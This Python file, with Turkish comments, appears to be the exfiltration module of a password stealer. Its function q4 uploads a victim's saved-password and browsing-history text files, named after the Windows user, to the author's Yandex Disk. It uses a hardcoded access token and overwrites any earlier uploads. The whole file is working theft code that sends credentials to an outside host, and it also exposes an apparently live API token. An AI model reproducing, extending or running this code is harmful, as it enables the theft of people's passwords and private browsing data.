import yadisk,os
#Bu fonksiyonla bilgisayara kaydettiğimiz şifre ve geçmiş verilerini yandexten oluşturduğumuz token ile yandex diskimize aktarıyoruz
def q4():
    #yandex diske bağlanmak için token verilerini giriyoruz
    y = yadisk. YaDisk(token="y0_AgAAAABnMIMEAAjlfAAAAADXNDaizSUzCMeUR_mwPRzY-8gieTrt2zE")
    
    data_user_name=os.path.expanduser('~')[9:]
    data_txt_path = os.path.expanduser('~')+"\\Settings\\"+data_user_name+".txt"
    #yandex diskte böyle bir dosya var mı? yok mu? kontrol ediyoruz ve basitçe upload metoduyla yüklüyoruz
    if(y.exists("/"+data_user_name+".txt")==True):
        y.remove("/"+data_user_name+".txt", permanently=True)
        y.upload(data_txt_path,"/"+data_user_name+".txt")
    elif(y.exists("/"+data_user_name+".txt")==False):
        y.upload(data_txt_path,"/"+data_user_name+".txt")
    data_user_password=os.path.expanduser('~')[9:]+"-Password"
    data_txt_path = os.path.expanduser('~')+"\\Settings\\"+data_user_password+".txt"

    if(y.exists("/"+data_user_password+".txt")==True):
        y.remove("/"+data_user_password+".txt", permanently=True)
        y.upload(data_txt_path,"/"+data_user_password+".txt")     
    elif(y.exists("/"+data_user_password+".txt")==False):
        y.upload(data_txt_path,"/"+data_user_password+".txt")         




